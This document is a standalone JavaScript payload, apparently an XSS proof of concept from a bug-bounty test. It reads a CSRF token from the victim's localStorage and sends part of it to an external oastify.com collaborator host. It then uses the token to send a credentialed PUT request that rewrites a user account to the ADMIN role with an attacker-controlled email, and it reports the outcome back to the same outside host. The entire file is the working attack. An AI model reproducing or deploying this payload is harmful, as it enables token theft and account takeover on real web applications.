(()=>{
    const csrf = localStorage.getItem('csrfToken');
    
    if (!csrf) {
        fetch('//vrqolxg0k9vrk5yiv5u9lpttfklb92xr.oastify.com/log?e=no-csrf');
        return;
    }
    
    fetch('//vrqolxg0k9vrk5yiv5u9lpttfklb92xr.oastify.com/log?csrf=' + encodeURIComponent(csrf.substring(0, 10)));
    
    fetch('/web/api2/v3/users/yD6g4rpcvcbp9JCazqrxk1', {
        method: 'PUT',
        credentials: 'include',
        headers: {
            'Content-Type': 'application/json',
            'X-Csrf-Token': csrf
        },
        body: JSON.stringify({
            firstName: "evil",
            lastName: "cathack",
            email: "aydilfhr+evil@intigriti.me",
            userName: "aydilfhr+evil",
            role: "ADMIN",
            timezone: "Europe/London",
            active: true,
            note: ""
        })
    })
    .then(r => r.text())
    .then(t => fetch('//vrqolxg0k9vrk5yiv5u9lpttfklb92xr.oastify.com/log?ok=1'))
    .catch(e => fetch('//vrqolxg0k9vrk5yiv5u9lpttfklb92xr.oastify.com/log?err=' + encodeURIComponent(e.message)));
})();
